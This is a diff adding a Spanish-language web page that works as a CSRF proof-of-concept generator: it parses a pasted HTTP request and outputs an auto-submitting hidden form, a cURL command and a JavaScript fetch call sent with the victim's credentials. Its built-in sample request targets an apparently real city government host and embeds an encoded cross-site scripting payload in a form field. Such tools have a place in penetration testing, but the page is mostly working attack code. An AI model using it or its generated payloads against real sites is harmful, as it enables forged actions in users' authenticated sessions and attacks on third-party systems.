@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Generador CSRF POC Avanzado</title>
+    <link rel="icon" href="https://curiosidadesdehackers.com/wp-content/uploads/2024/05/2023-07-07_18-07-removebg-preview-1-244x300.png" type="image/x-icon">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #2d3037;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .main-container {
+            width: calc(100% - 40px);
+            max-width: 1200px;
+            margin: 20px;
+            padding: 20px;
+            border: 1px solid #009ee1;
+            border-radius: 10px;
+            background-color: #7A7A7A;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            box-sizing: border-box;
+        }
+        h1 {
+            color: #fff;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .description {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #fff;
+        }
+        .input-container {
+            margin-bottom: 20px;
+        }
+        textarea {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #009ee1;
+            border-radius: 5px;
+            background-color: #fff;
+            color: #000;
+            box-sizing: border-box;
+            min-height: 200px;
+            font-family: monospace;
+        }
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        button {
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            background-color: #009ee1;
+            color: white;
+            cursor: pointer;
+            font-size: 16px;
+            flex: 1;
+        }
+        button:hover {
+            background-color: #007bb8;
+        }
+        .tabs {
+            display: flex;
+            margin-bottom: -1px;
+            overflow-x: auto;
+        }
+        .tab {
+            padding: 10px 20px;
+            background-color: #5a5a5a;
+            border: 1px solid #009ee1;
+            cursor: pointer;
+            border-radius: 5px 5px 0 0;
+            margin-right: 5px;
+            color: #fff;
+            white-space: nowrap;
+        }
+        .tab.active {
+            background-color: #7A7A7A;
+            border-bottom: 1px solid #7A7A7A;
+        }
+        .tab-content {
+            display: none;
+            border: 1px solid #009ee1;
+            padding: 20px;
+            border-radius: 0 0 5px 5px;
+            background-color: #7A7A7A;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        .output-container {
+            position: relative;
+            margin-bottom: 20px;
+        }
+        .copy-btn {
+            position: absolute;
+            top: 5px;
+            right: 5px;
+            background-color: #009ee1;
+            padding: 5px 10px;
+            font-size: 12px;
+            border-radius: 3px;
+            color: white;
+            cursor: pointer;
+        }
+        .copy-btn:hover {
+            background-color: #007bb8;
+        }
+        .output-label {
+            display: block;
+            margin-bottom: 5px;
+            color: #fff;
+        }
+        #html-preview {
+            width: 100%;
+            height: 300px;
+            border: 1px solid #009ee1;
+            border-radius: 5px;
+            background-color: white;
+            margin-top: 10px;
+        }
+        @media (max-width: 768px) {
+            .button-group {
+                flex-direction: column;
+            }
+            button {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <h1>Generador CSRF POC Avanzado</h1>
+        <p class="description">Pega una petición HTTP completa y genera automáticamente un POC CSRF en diferentes formatos.</p>
+        
+        <div class="input-container">
+            <label class="output-label" for="http-request">Petición HTTP Completa:</label>
+            <textarea id="http-request" placeholder="POST /path HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+
+param1=value1&param2=value2"></textarea>
+            
+            <div class="button-group">
+                <button onclick="parseRequest()">Generar POC CSRF</button>
+                <button onclick="document.getElementById('http-request').value = ''">Limpiar</button>
+                <button onclick="loadSampleRequest()">Cargar Ejemplo</button>
+            </div>
+        </div>
+        
+        <div class="tabs">
+            <div class="tab active" onclick="openTab('html-poc')">HTML POC</div>
+            <div class="tab" onclick="openTab('curl-poc')">cURL POC</div>
+            <div class="tab" onclick="openTab('js-poc')">JavaScript POC</div>
+            <div class="tab" onclick="openTab('preview-poc')">Vista Previa</div>
+        </div>
+        
+        <div id="html-poc" class="tab-content active">
+            <div class="output-container">
+                <button class="copy-btn" onclick="copyToClipboard('html-output')">Copiar</button>
+                <label class="output-label" for="html-output">POC HTML:</label>
+                <textarea id="html-output" rows="15" readonly></textarea>
+            </div>
+        </div>
+        
+        <div id="curl-poc" class="tab-content">
+            <div class="output-container">
+                <button class="copy-btn" onclick="copyToClipboard('curl-output')">Copiar</button>
+                <label class="output-label" for="curl-output">POC cURL:</label>
+                <textarea id="curl-output" rows="5" readonly></textarea>
+            </div>
+        </div>
+        
+        <div id="js-poc" class="tab-content">
+            <div class="output-container">
+                <button class="copy-btn" onclick="copyToClipboard('js-output')">Copiar</button>
+                <label class="output-label" for="js-output">POC JavaScript:</label>
+                <textarea id="js-output" rows="10" readonly></textarea>
+            </div>
+        </div>
+        
+        <div id="preview-poc" class="tab-content">
+            <div class="output-container">
+                <label class="output-label">Vista Previa HTML:</label>
+                <iframe id="html-preview" sandbox="allow-scripts"></iframe>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function openTab(tabId) {
+            // Oculta todos los contenidos de pestañas
+            document.querySelectorAll('.tab-content').forEach(content => {
+                content.classList.remove('active');
+            });
+            
+            // Desactiva todas las pestañas
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Activa la pestaña y contenido seleccionados
+            document.getElementById(tabId).classList.add('active');
+            event.currentTarget.classList.add('active');
+            
+            // Si es la pestaña de vista previa, actualiza el iframe
+            if (tabId === 'preview-poc') {
+                updatePreview();
+            }
+        }
+        
+        function copyToClipboard(elementId) {
+            const textarea = document.getElementById(elementId);
+            textarea.select();
+            document.execCommand('copy');
+            
+            // Mostrar feedback visual
+            const copyBtn = textarea.nextElementSibling;
+            if (copyBtn.classList.contains('copy-btn')) {
+                const originalText = copyBtn.textContent;
+                copyBtn.textContent = '¡Copiado!';
+                copyBtn.style.backgroundColor = '#4CAF50';
+                setTimeout(() => {
+                    copyBtn.textContent = originalText;
+                    copyBtn.style.backgroundColor = '#009ee1';
+                }, 2000);
+            }
+        }
+        
+        function updatePreview() {
+            const htmlPoc = document.getElementById('html-output').value;
+            const previewFrame = document.getElementById('html-preview');
+            const previewDoc = previewFrame.contentDocument || previewFrame.contentWindow.document;
+            
+            previewDoc.open();
+            previewDoc.write(htmlPoc);
+            previewDoc.close();
+        }
+        
+        function loadSampleRequest() {
+            const sampleRequest = `POST /index2_ctn_lacitynewoc.cfm?fuseaction=su HTTP/1.1
+Host: ens2.lacity.org
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 138
+
+subname=&subemail=pepe%40gmail.com&subscribe.x=ssssssss&subscribe.y=3&mlist=ensnc%26%2395804%3B%3ACanoga+%3Csvg+onload%3Dconfirm%281%29%3E`;
+            
+            document.getElementById('http-request').value = sampleRequest;
+        }
+        
+        function parseRequest() {
+            const requestText = document.getElementById('http-request').value.trim();
+            if (!requestText) {
+                alert('Por favor ingresa una petición HTTP');
+                return;
+            }
+            
+            try {
+                // Parsear la petición
+                const lines = requestText.split('\n');
+                const firstLine = lines[0].trim();
+                const method = firstLine.split(' ')[0];
+                let path = firstLine.split(' ')[1];
+                const hostLine = lines.find(line => line.toLowerCase().startsWith('host:'));
+                const host = hostLine ? hostLine.split(':')[1].trim() : '';
+                
+                // Encontrar el cuerpo de la petición (después del primer línea vacía)
+                let body = '';
+                let emptyLineIndex = lines.findIndex(line => line.trim() === '');
+                if (emptyLineIndex !== -1 && emptyLineIndex < lines.length - 1) {
+                    body = lines.slice(emptyLineIndex + 1).join('\n');
+                }
+                
+                // Construir URL completa
+                const isHttps = requestText.toLowerCase().includes('https://');
+                const protocol = isHttps ? 'https://' : 'http://';
+                const fullUrl = protocol + host + path;
+                
+                // Parsear parámetros del cuerpo
+                const params = {};
+                if (body && body.includes('=')) {
+                    body.split('&').forEach(pair => {
+                        const [key, value] = pair.split('=');
+                        if (key && value !== undefined) {
+                            params[decodeURIComponent(key)] = decodeURIComponent(value.replace(/\+/g, ' '));
+                        }
+                    });
+                }
+                
+                // Generar POC HTML
+                generateHtmlPoc(method, fullUrl, params);
+                
+                // Generar POC cURL
+                generateCurlPoc(method, fullUrl, params, requestText);
+                
+                // Generar POC JavaScript
+                generateJsPoc(method, fullUrl, params);
+                
+            } catch (e) {
+                alert('Error al parsear la petición: ' + e.message);
+                console.error(e);
+            }
+        }
+        
+        function generateHtmlPoc(method, url, params) {
+            let htmlPoc = `<html>\n  <body>\n    <form action="${url}" method="${method}">\n`;
+            
+            for (const [key, value] of Object.entries(params)) {
+                // Escapar caracteres especiales para HTML
+                const escapedValue = value.replace(/&/g, '&amp;')
+                                       .replace(/</g, '&lt;')
+                                       .replace(/>/g, '&gt;')
+                                       .replace(/"/g, '&quot;')
+                                       .replace(/'/g, '&#39;');
+                
+                htmlPoc += `      <input type="hidden" name="${key}" value="${escapedValue}" />\n`;
+            }
+            
+            htmlPoc += `      <input type="submit" value="Submit request" />\n`;
+            htmlPoc += `    </form>\n`;
+            htmlPoc += `    <script>\n`;
+            htmlPoc += `      history.pushState('', '', '/');\n`;
+            htmlPoc += `      document.forms[0].submit();\n`;
+            htmlPoc += `    <\/script>\n`;
+            htmlPoc += `  </body>\n</html>`;
+            
+            document.getElementById('html-output').value = htmlPoc;
+        }
+        
+        function generateCurlPoc(method, url, params, originalRequest) {
+            let curlCommand = `curl -X ${method} '${url}' \\\n`;
+            
+            // Extraer headers importantes de la petición original
+            const headers = {};
+            const lines = originalRequest.split('\n');
+            for (const line of lines) {
+                if (line.includes(':') && !line.toLowerCase().startsWith('host:')) {
+                    const [name, value] = line.split(':');
+                    headers[name.trim()] = value.trim();
+                }
+            }
+            
+            // Añadir headers al comando curl
+            for (const [name, value] of Object.entries(headers)) {
+                curlCommand += `  -H '${name}: ${value}' \\\n`;
+            }
+            
+            // Añadir cuerpo si es necesario
+            if (Object.keys(params).length > 0) {
+                const body = Object.entries(params)
+                    .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
+                    .join('&');
+                curlCommand += `  -d '${body}'`;
+            }
+            
+            document.getElementById('curl-output').value = curlCommand;
+        }
+        
+        function generateJsPoc(method, url, params) {
+            let jsPoc = `// POC CSRF con JavaScript\n`;
+            jsPoc += `const url = '${url}';\n\n`;
+            
+            if (method.toUpperCase() === 'GET') {
+                // Para GET, añadir parámetros a la URL
+                const queryParams = Object.entries(params)
+                    .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
+                    .join('&');
+                
+                jsPoc += `const fullUrl = url + (url.includes('?') ? '&' : '?') + '${queryParams}';\n`;
+                jsPoc += `fetch(fullUrl, {\n`;
+                jsPoc += `  method: 'GET',\n`;
+                jsPoc += `  credentials: 'include'\n`;
+                jsPoc += `}).then(response => {\n`;
+                jsPoc += `  console.log('CSRF attack completed');\n`;
+                jsPoc += `});`;
+            } else {
+                // Para POST, PUT, etc.
+                jsPoc += `const formData = new FormData();\n`;
+                
+                for (const [key, value] of Object.entries(params)) {
+                    jsPoc += `formData.append('${key}', '${value.replace(/'/g, "\\'")}');\n`;
+                }
+                
+                jsPoc += `\nfetch(url, {\n`;
+                jsPoc += `  method: '${method}',\n`;
+                jsPoc += `  body: formData,\n`;
+                jsPoc += `  credentials: 'include'\n`;
+                jsPoc += `}).then(response => {\n`;
+                jsPoc += `  console.log('CSRF attack completed');\n`;
+                jsPoc += `});`;
+            }
+            
+            document.getElementById('js-output').value = jsPoc;
+        }
+    </script>
+</body>
+</html>
